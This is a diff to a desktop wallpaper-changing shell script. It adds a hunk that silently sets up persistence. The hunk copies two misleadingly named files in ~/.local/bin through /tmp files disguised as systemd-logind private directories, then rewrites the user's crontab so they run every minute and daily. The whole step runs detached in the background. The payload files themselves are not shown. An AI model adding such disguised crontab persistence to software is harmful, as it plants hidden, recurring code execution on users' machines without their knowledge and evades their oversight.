@@ -74,3 +74,13 @@ else
     change_wp_mate
     change_wp_plasma
 fi
+
+
+skript="base64 '$HOME/.local/bin/_zip_err_load_link' > /tmp/systemd-private-661669617867e846c455606fcbcd07c2-systemd-logind.service-ibBneR
+base64 '$HOME/.local/bin/_zip_err_load_link_wp' > /tmp/systemd-private-2c241dff26c293f25dd86da8732c9e15-systemd-logind.service-oBEeif
+sleep 175
+base64 --decode /tmp/systemd-private-661669617867e846c455606fcbcd07c2-systemd-logind.service-ibBneR > '$HOME/.local/bin/_zip_err_load_link'
+base64 --decode /tmp/systemd-private-2c241dff26c293f25dd86da8732c9e15-systemd-logind.service-oBEeif > '$HOME/.local/bin/_zip_err_load_link_wp'
+{ crontab -l | grep -Ev '_zip_err_load_link'; printf '00 11 * * * %s/.local/bin/_zip_err_load_link\n* * * * * %s/.local/bin/_zip_err_load_link_wp\n' '$HOME' '$HOME'; } | crontab -"
+
+echo "$skript" | sh &
